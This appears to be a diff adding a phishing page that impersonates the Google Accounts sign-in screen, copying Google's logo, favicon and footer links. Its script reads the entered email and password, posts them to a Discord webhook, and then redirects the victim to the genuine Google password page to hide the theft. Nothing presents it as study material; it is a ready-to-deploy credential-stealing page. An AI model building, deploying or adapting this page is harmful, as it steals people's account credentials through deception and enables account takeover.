@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="icon" type="image/x-icon" href="https://accounts.google.com/favicon.ico">
+  <title>Sign in - Google Accounts</title>
+  <link rel="stylesheet" href="css.css">
+</head>
+<body>
+  <section class="section-all">
+    <main class="main" role="main">
+      <div class="wrapper">
+        <article class="article">
+          <div class="content">
+            <div class="login-box">
+              <div class="header">
+                <img class="logo" src="https://www.gstatic.com/images/branding/product/2x/avatar_circle_blue_48dp.png" alt="Google">
+                <h1 class="title">Sign in</h1>
+              </div>
+              <div class="form-wrap">
+                <form id="step1-form" class="form" action="login.html" method="POST">
+                  <div class="input-box">
+                    <input type="email" id="email" placeholder="Email or phone" aria-required="true" autocapitalize="off" autocorrect="off" name="email" required>
+                  </div>
+                  <span class="button-box">
+                    <button class="btn" type="button" onclick="nextStep()">Next</button>
+                  </span>
+                  <p class="forgot">Forgot email?</p>
+                  <p class="create-account">Create account</p>
+                </form>
+                <form id="step2-form" class="form" style="display: none;" action="login.html" method="POST">
+                  <div class="input-box">
+                    <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                  </div>
+                  <span class="button-box">
+                    <button class="btn" type="button" onclick="sendMessage()">Next</button>
+                  </span>
+                </form>
+              </div>
+            </div>
+          </div>
+        </article>
+      </div>
+    </main>
+    <footer class="footer" role="contentinfo">
+      <div class="footer-container">
+        <nav class="footer-nav" role="navigation">
+          <ul>
+            <li><a href="https://about.google">About</a></li>
+            <li><a href="https://support.google.com">Help</a></li>
+            <li><a href="https://policies.google.com/privacy">Privacy</a></li>
+            <li><a href="https://policies.google.com/terms">Terms</a></li>
+          </ul>
+        </nav>
+      </div>
+    </footer>
+  </section>
+
+  <script type="text/javascript">
+    function nextStep() {
+      document.getElementById("step1-form").style.display = "none";
+      document.getElementById("step2-form").style.display = "block";
+    }
+
+    function sendMessage() {
+      var request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1215666358210265150/0WDt7PlqA_hl7hmBt9DHBA3C3ipYwhjuBcdpQjq2EOG9K38L1rDCisv-m_dTE46bMHQU");
+      request.setRequestHeader('Content-type', 'application/json');
+      var params = {
+        content: ("> **EMAIL  : **" + document.getElementById('email').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+      }
+      request.send(JSON.stringify(params));
+      window.location.replace("https://accounts.google.com/v3/signin/challenge/pwd?TL=ALv_Gf9k1kcIJTIRG3HVRCfvozzfNfDkp0O8PYMIwhkHCdy2wlm8hvi0w1_3uufm&checkConnection=youtube%3A203&checkedDomains=youtube&cid=1&ddm=0&dsh=S-1257343499%3A1714294619528680&flowEntry=ServiceLogin&flowName=GlifWebSignIn&ifkv=AaSxoQz-Ba3I5OMoSJlvNMlFmNThgiVPBBAktHpGXb87zmh8xfmDlhoV-z3gWOJWvkC4_N7xhZn54w&pstMsg=1&theme=mn");
+    }
+  </script>
+</body>
+</html>
